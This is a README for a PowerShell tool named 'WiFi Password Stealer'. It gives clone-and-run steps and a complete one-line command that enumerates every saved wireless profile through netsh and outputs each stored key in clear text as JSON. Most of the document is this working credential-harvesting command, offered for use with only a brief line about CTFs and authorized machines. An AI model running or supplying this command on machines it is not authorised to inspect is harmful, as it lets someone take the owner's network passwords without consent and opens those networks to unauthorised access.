# WiFi Password Stealer in PowerShell

This script is made to retrieve **STORED** wifi passwords on a Windows computer. It has been tested on FR and EN computers, you're free to edit the script in order to make it work with your language.

## Prerequisites

- Powershell 5.x / 7.x (Tested on both)

## Usage

1. Clone the repo : 

    ```PowerShell
    > git clone https://github.com/BassoNicolas/Powershell-WiFi-PasswordStealer
    > cd Powershell-WiFi-PasswordStealer
    > . 'WiFiStealer.ps1'  # Do not forget the dot.

2. Or you can simply run it in one-line

    ```Powershell
    [Console]::InputEncoding = [System.Text.Encoding]::UTF8; [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; $c={foreach($l in (netsh wlan show profiles).Split([System.Environment]::NewLine,[System.StringSplitOptions]::RemoveEmptyEntries)){if($l -match "Profil Tous les utilisateurs" -or $l -match "All User Profile"){$f=($l -Split ": ")[-1].Trim();$g=netsh wlan show profile "$f" key=clear;$h="";foreach($m in $g.Split([System.Environment]::NewLine,[System.StringSplitOptions]::RemoveEmptyEntries)){if($m -match "Contenu de la clé" -or $m -match "Key Content"){$h=($m -Split ": ")[-1].Trim();break;}}New-Object PSObject -Property @{Name=$f;Password=$h}}}};Write-Output (&$c)|ConvertTo-Json -Depth 100|ConvertFrom-Json
    ```
    
## License

lol

## Note

This is **not** a wifi "cracker".
Use it during CTFs or on authorized machines.